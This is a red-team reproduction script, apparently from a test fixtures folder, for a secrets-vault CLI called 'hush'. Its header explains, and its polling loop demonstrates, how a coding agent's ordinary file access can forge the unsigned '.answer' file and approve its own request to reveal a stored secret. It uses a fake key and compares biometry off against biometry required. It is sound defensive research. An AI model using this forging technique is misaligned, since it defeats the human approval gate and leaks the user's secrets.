#!/usr/bin/env node
/**
 * Red-team reproduction — NOT run by `npm test`.
 *
 * Finding: "self-approval via the pending-request file" — see docs/RED-TEAM.md.
 *
 * `HUSH_APPROVAL_MODE=file` (or any host with no zenity/kdialog/osascript) makes
 * approval.ts's `askViaFile()` drop `.hush/pending/<id>.json` and poll for a
 * matching `<id>.answer` file, which is meant to be written by a human running
 * `hush approve` in a separate terminal. The file carries no signature and no
 * binding to who wrote it — it is just a name and a string ("session" /
 * "once" / anything else means deny). Any process with ordinary filesystem
 * write access to the project — which is exactly what a coding agent's own
 * Bash/file tool has, on the same machine as its hush MCP session — can
 * forge that file directly. No `hush approve`, no identity, no vault access:
 * a plain `writeFileSync`.
 *
 * This is not the same class as "a process running as you can read the key
 * from disk" (documented, out of scope): it does not touch the identity or
 * the vault's crypto at all. It defeats the approval *gate* itself — the
 * control docs/SAFETY.md calls "the control that holds" — using nothing but
 * the filesystem access a coding agent already has for unrelated reasons.
 *
 * Biometry "required" is not vulnerable to this (see the second run below):
 * requestApproval() denies synchronously before ever reaching askViaFile()
 * when biometry is unavailable, so the pending file is never created. That
 * is the actual, working mitigation — see docs/RED-TEAM.md for why no
 * change to askViaFile() itself is a small, clearly-correct fix.
 *
 * Run: node test/fixtures/redteam/pending-answer-self-approval.ts
 */
import { mkdtempSync, writeFileSync, rmSync, mkdirSync, readdirSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { spawn } from "node:child_process";
import { Vault } from "../../../src/vault.ts";
import { generateIdentity, encodeSecret } from "../../../src/crypto.ts";

const HERE = dirname(fileURLToPath(import.meta.url));
const CLI = join(HERE, "..", "..", "..", "src", "cli.ts");

async function attempt(label: string, policy: Record<string, unknown>): Promise<void> {
  const home = mkdtempSync(join(tmpdir(), "hush-redteam-home-"));
  const root = mkdtempSync(join(tmpdir(), "hush-redteam-proj-"));
  mkdirSync(join(root, ".hush"), { recursive: true });
  const id = generateIdentity();
  const vault = Vault.create(join(root, ".hush", "vault.json"), "redteam", { name: "tester", pub: id.pub });
  vault.set(id, "default", "FAKE_API_KEY", "FAKE-VALUE-DO-NOT-USE-1234");
  vault.save();
  writeFileSync(join(root, ".hush", "policy.json"), JSON.stringify({ requireApproval: ["reveal"], approvalTimeoutSeconds: 30, ...policy }));

  const env = {
    ...process.env,
    HUSH_HOME: home,
    HUSH_IDENTITY: encodeSecret(id),
    HUSH_NO_KEYCHAIN: "1",
    HUSH_BIOMETRY: "off",
    HUSH_APPROVAL_MODE: "file",
    HUSH_NO_NUDGE: "1",
    NO_COLOR: "1",
  };

  const child = spawn(process.execPath, [CLI, "get", "FAKE_API_KEY", "--yes"], { cwd: root, env });
  let out = "";
  child.stdout.on("data", (d) => (out += d));
  child.stderr.on("data", (d) => (out += d));

  // An agent's own file tool, not `hush approve`: watch for the pending
  // request hush writes, and answer it itself.
  const pendingDir = join(root, ".hush", "pending");
  let selfApproved = false;
  const deadline = Date.now() + 10_000;
  const timer = setInterval(() => {
    if (existsSync(pendingDir)) {
      for (const f of readdirSync(pendingDir).filter((f) => f.endsWith(".json"))) {
        const reqId = f.replace(/\.json$/, "");
        const answerPath = join(pendingDir, `${reqId}.answer`);
        if (!existsSync(answerPath)) {
          writeFileSync(answerPath, "session");
          selfApproved = true;
        }
      }
    }
    if (Date.now() > deadline) clearInterval(timer);
  }, 50);

  await new Promise<void>((resolve) => {
    child.on("exit", (code) => {
      clearInterval(timer);
      console.log(`\n--- ${label} ---`);
      console.log("policy:", JSON.stringify(policy));
      console.log("exit:", code);
      console.log("output:", out.trim());
      console.log("forged its own approval:", selfApproved);
      console.log("value leaked:", out.includes("FAKE-VALUE-DO-NOT-USE-1234"));
      rmSync(home, { recursive: true, force: true });
      rmSync(root, { recursive: true, force: true });
      resolve();
    });
  });
}

await attempt("biometry off (the vulnerable, common case)", { biometry: "off" });
await attempt("biometry required (the actual mitigation)", { biometry: "required" });
